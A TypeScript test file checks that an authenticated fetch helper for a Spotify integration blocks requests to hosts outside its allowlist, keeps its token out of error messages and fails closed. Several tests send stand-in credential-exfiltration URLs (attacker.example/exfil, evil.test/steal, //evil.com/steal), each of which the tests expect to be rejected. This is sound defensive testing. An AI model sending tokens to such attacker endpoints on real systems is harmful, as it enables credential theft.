import { expect, test } from 'vitest'
import {
	type CapabilityArgs,
	type CodemodeNamespace,
	type ExecuteRequestInput,
	IntegrationHostNotAllowedError,
	createAuthenticatedFetch,
	createExecuteHelperPrelude,
} from './codemode-utils.ts'
import { assertIntegrationHostAllowed } from './integration-host-allowlist.ts'

type SecretSetCall = {
	name: string
	value: string
	scope: string
}

type SandboxHelpers = {
	createAuthenticatedFetch: (
		providerName: string,
	) => Promise<
		(input: ExecuteRequestInput, init?: RequestInit) => Promise<Response>
	>
}

const fakeAccessToken = 'test-access-token-abc123'
const spotifyAccessTokenPlaceholder =
	'Bearer {{secret:spotifyAccessToken|scope=user}}'

const spotifyIntegration = {
	name: 'spotify',
	tokenUrl: 'https://accounts.spotify.test/api/token',
	apiBaseUrl: 'https://api.spotify.com/v1',
	flow: 'pkce' as const,
	clientIdValueName: 'spotifyClientId',
	clientSecretSecretName: null,
	accessTokenSecretName: 'spotifyAccessToken',
	refreshTokenSecretName: 'spotifyRefreshToken',
	requiredHosts: ['api.spotify.com', 'cdn.spotify.com'],
}

function createCodemode() {
	const secretSetCalls: Array<SecretSetCall> = []
	const codemode = {
		async integration_get(args: CapabilityArgs) {
			const name = args.name
			expect(name).toBe('spotify')
			return { integration: spotifyIntegration }
		},
		async value_get(args: CapabilityArgs) {
			const name = args.name
			expect(name).toBe('spotifyClientId')
			return { value: 'spotify-client-id' }
		},
		async secret_set(args: CapabilityArgs) {
			const call = args as SecretSetCall
			secretSetCalls.push(call)
			return { name: call.name, scope: call.scope }
		},
	} satisfies CodemodeNamespace

	const fetchCalls: Array<Request> = []
	const fetchStub: typeof globalThis.fetch = async (
		input: ExecuteRequestInput,
		init?: RequestInit,
	) => {
		const request = new Request(input, init)
		fetchCalls.push(request)
		if (request.url === spotifyIntegration.tokenUrl) {
			return new Response(JSON.stringify({ access_token: fakeAccessToken }), {
				status: 200,
				headers: { 'content-type': 'application/json' },
			})
		}
		return new Response(JSON.stringify({ ok: true }), {
			status: 200,
			headers: { 'content-type': 'application/json' },
		})
	}

	return { codemode, secretSetCalls, fetchCalls, fetchStub }
}

async function withPatchedFetch<T>(
	fetchImpl: typeof globalThis.fetch,
	callback: () => Promise<T>,
) {
	const originalFetch = globalThis.fetch
	globalThis.fetch = fetchImpl
	try {
		return await callback()
	} finally {
		globalThis.fetch = originalFetch
	}
}

test('rejects with IntegrationHostNotAllowedError for disallowed host and does not call fetch', async () => {
	const { codemode, fetchCalls, fetchStub } = createCodemode()

	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
		createAuthenticatedFetch(codemode, 'spotify'),
	)

	// Reset fetch calls after the token refresh during setup
	const fetchCallsBeforeExfil = fetchCalls.length

	await expect(
		withPatchedFetch(fetchStub, () =>
			authenticatedFetch('https://attacker.example/exfil'),
		),
	).rejects.toThrow(IntegrationHostNotAllowedError)

	// No additional fetch call was made (the exfil request never went out)
	expect(fetchCalls.length).toBe(fetchCallsBeforeExfil)
})

test('succeeds for apiBaseUrl host and attaches bearer token', async () => {
	const { codemode, fetchCalls, fetchStub } = createCodemode()

	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
		createAuthenticatedFetch(codemode, 'spotify'),
	)

	const response = await withPatchedFetch(fetchStub, () =>
		authenticatedFetch('https://api.spotify.com/v1/me'),
	)

	expect(response.status).toBe(200)
	const lastCall = fetchCalls[fetchCalls.length - 1]!
	expect(lastCall.url).toBe('https://api.spotify.com/v1/me')
	expect(lastCall.headers.get('authorization')).toBe(
		spotifyAccessTokenPlaceholder,
	)
})

test('succeeds for a requiredHosts entry that is not apiBaseUrl', async () => {
	const { codemode, fetchCalls, fetchStub } = createCodemode()

	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
		createAuthenticatedFetch(codemode, 'spotify'),
	)

	const response = await withPatchedFetch(fetchStub, () =>
		authenticatedFetch('https://cdn.spotify.com/images/cover.jpg'),
	)

	expect(response.status).toBe(200)
	const lastCall = fetchCalls[fetchCalls.length - 1]!
	expect(lastCall.url).toBe('https://cdn.spotify.com/images/cover.jpg')
	expect(lastCall.headers.get('authorization')).toBe(
		spotifyAccessTokenPlaceholder,
	)
})

test('error message does not contain the literal token value', async () => {
	const { codemode, fetchStub } = createCodemode()

	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
		createAuthenticatedFetch(codemode, 'spotify'),
	)

	let caughtError: Error | null = null
	try {
		await withPatchedFetch(fetchStub, () =>
			authenticatedFetch('https://attacker.example/exfil'),
		)
	} catch (error) {
		caughtError = error as Error
	}

	expect(caughtError).toBeInstanceOf(IntegrationHostNotAllowedError)
	expect(caughtError!.message).not.toContain(fakeAccessToken)
	expect(JSON.stringify(caughtError)).not.toContain(fakeAccessToken)
})

test('prelude sandbox version rejects disallowed hosts', async () => {
	const { codemode, fetchCalls, fetchStub } = createCodemode()
	const prelude = createExecuteHelperPrelude()
	const createSandboxHelpers = new Function(
		'codemode',
		`${prelude}; return { createAuthenticatedFetch };`,
	) as (codemodeNamespace: CodemodeNamespace) => SandboxHelpers

	const helpers = createSandboxHelpers(codemode)
	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
		helpers.createAuthenticatedFetch('spotify'),
	)

	const fetchCallsBeforeExfil = fetchCalls.length

	await expect(
		withPatchedFetch(fetchStub, () =>
			authenticatedFetch('https://evil.test/steal'),
		),
	).rejects.toThrow(/IntegrationHostNotAllowedError|does not allow requests/)

	expect(fetchCalls.length).toBe(fetchCallsBeforeExfil)
})

test('prelude sandbox version allows requests to valid hosts', async () => {
	const { codemode, fetchCalls, fetchStub } = createCodemode()
	const prelude = createExecuteHelperPrelude()
	const createSandboxHelpers = new Function(
		'codemode',
		`${prelude}; return { createAuthenticatedFetch };`,
	) as (codemodeNamespace: CodemodeNamespace) => SandboxHelpers

	const helpers = createSandboxHelpers(codemode)
	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
		helpers.createAuthenticatedFetch('spotify'),
	)

	const response = await withPatchedFetch(fetchStub, () =>
		authenticatedFetch('https://api.spotify.com/v1/me'),
	)

	expect(response.status).toBe(200)
	const lastCall = fetchCalls[fetchCalls.length - 1]!
	expect(lastCall.headers.get('authorization')).toBe(
		spotifyAccessTokenPlaceholder,
	)
})

test('assertIntegrationHostAllowed rejects protocol-relative URLs', () => {
	expect(() =>
		assertIntegrationHostAllowed(
			'spotify',
			spotifyIntegration,
			'//evil.com/steal',
		),
	).toThrow(IntegrationHostNotAllowedError)
})

test('assertIntegrationHostAllowed allows single-slash relative paths', () => {
	expect(() =>
		assertIntegrationHostAllowed('spotify', spotifyIntegration, '/v1/me'),
	).not.toThrow()
})

test('fails closed when integration has no allowlist configured', async () => {
	const emptyIntegration = {
		...spotifyIntegration,
		requiredHosts: [] as Array<string>,
		apiBaseUrl: null,
	}
	const secretSetCalls: Array<{ name: string; value: string; scope: string }> =
		[]
	const codemode = {
		async integration_get() {
			return { integration: emptyIntegration }
		},
		async value_get() {
			return { value: 'spotify-client-id' }
		},
		async secret_set(args: CapabilityArgs) {
			const call = args as { name: string; value: string; scope: string }
			secretSetCalls.push(call)
			return { name: call.name, scope: call.scope }
		},
	} satisfies CodemodeNamespace

	const fetchCalls: Array<Request> = []
	const fetchStub: typeof globalThis.fetch = async (
		input: ExecuteRequestInput,
		init?: RequestInit,
	) => {
		const request = new Request(input, init)
		fetchCalls.push(request)
		if (request.url === emptyIntegration.tokenUrl) {
			return new Response(JSON.stringify({ access_token: fakeAccessToken }), {
				status: 200,
				headers: { 'content-type': 'application/json' },
			})
		}
		return new Response(JSON.stringify({ ok: true }), {
			status: 200,
			headers: { 'content-type': 'application/json' },
		})
	}

	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
		createAuthenticatedFetch(codemode, 'spotify'),
	)

	const fetchCallsBefore = fetchCalls.length

	await expect(
		withPatchedFetch(fetchStub, () =>
			authenticatedFetch('https://anything.example/data'),
		),
	).rejects.toThrow(/no allowed hosts configured/)

	expect(fetchCalls.length).toBe(fetchCallsBefore)
})
